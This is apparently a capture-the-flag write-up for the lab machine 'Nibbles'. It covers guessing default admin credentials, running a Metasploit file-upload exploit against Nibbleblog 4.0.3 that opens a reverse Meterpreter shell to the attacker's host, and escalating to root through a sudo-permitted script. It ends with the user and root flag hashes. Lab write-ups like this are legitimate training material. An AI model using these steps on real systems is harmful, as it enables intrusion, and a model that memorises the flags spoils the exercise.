# Nibbles - 10.10.10.75
## Gobuster scan on http

upon closer inspection of the website, viewing the source reveals a hidden directory

### /nibbleblog

running gobuster on this page immediately gets results and I notice that there is an admin.php extention

after a few guesses.. admin:admin, nibbles:nibbles, nibbles:nibble, `admin:nibbles` I get a login and am able to access the admin panel

Username: admin
Password: nibbles

Looking through the page, under settings at the bottom we see the version of nibbleblog that is currently installed

Nibbleblog 4.0.3 "Coffee" - Developed by Diego Najar

With this information we can figure out an exploit using seachsploit that runs on this specific version

There is a metasploit module that performs an arbitratry file upload to the website

```ruby
msf5 exploit(multi/http/nibbleblog_file_upload) > show options

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the web application
   USERNAME                    yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3


msf5 exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 10.10.10.75
RHOSTS => 10.10.10.75
msf5 exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
USERNAME => admin
msf5 exploit(multi/http/nibbleblog_file_upload) > set password nibbles
password => nibbles
msf5 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI /nibbleblog/
TARGETURI => /nibbleblog/
msf5 exploit(multi/http/nibbleblog_file_upload) > run

[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] Sending stage (38288 bytes) to 10.10.10.75
[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.10.10.75:57512) at 2020-05-09 07:38:34 -0400
[+] Deleted image.php

meterpreter > 
```

running the expoit with the correct options gives us a meterpreter shell


moving into nibbler's home directory, we have user.txt and a personal.zip file
```
meterpreter > cd nibbler
meterpreter > ls
Listing: /home/nibbler
======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  0     fil   2017-12-29 05:29:56 -0500  .bash_history
40775/rwxrwxr-x   4096  dir   2017-12-10 22:04:04 -0500  .nano
100400/r--------  1855  fil   2017-12-10 22:07:21 -0500  personal.zip
100400/r--------  33    fil   2017-12-10 22:35:21 -0500  user.txt

meterpreter > cat user.txt
b02ff32bb332deba49eeaed21152c8d8

```

## onto root

look for the low hanging fruit `sudo -l`

```
sudo -l
sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

so as nibbler we can run this file monitor.sh as root

download the file and examine it to see if i can get a root shell from it 

simply by adding bash to the top of the file and executing monitor.sh with sudo we can get back a root shell

however we need to set the environment properly before we can use a text editor like vi

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'                                                                                                                         
nibbler@Nibbles:/home/nibbler/personal/stuff$ ^Z                                                                                                                          
[1]+  Stopped                 nc -lvnp 1985                                          
jonathan@kali:~/htb/boxes/owned/nibbles$ stty raw -echo                              
jonathan@kali:~/htb/boxes/owned/nibbles$ nc -lvnp 1985

nibbler@Nibbles:/home/nibbler/personal/stuff$ stty rows 40 columns 170

```

with the shell properly set we open the file with vi, type the bash command right after the shebang and excute th efile with sudo

## win
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
sudo: unable to resolve host Nibbles: Connection timed out
root@Nibbles:/home/nibbler/personal/stuff# 

root@Nibbles:/home/nibbler/personal/stuff# cd /root
root@Nibbles:~# ls
root.txt
root@Nibbles:~# cat root.txt
b6d745c0dfb6457c55591efc898ef88c
```

user.txt: b02ff32bb332deba49eeaed21152c8d8
root.txt: b6d745c0dfb6457c55591efc898ef88c


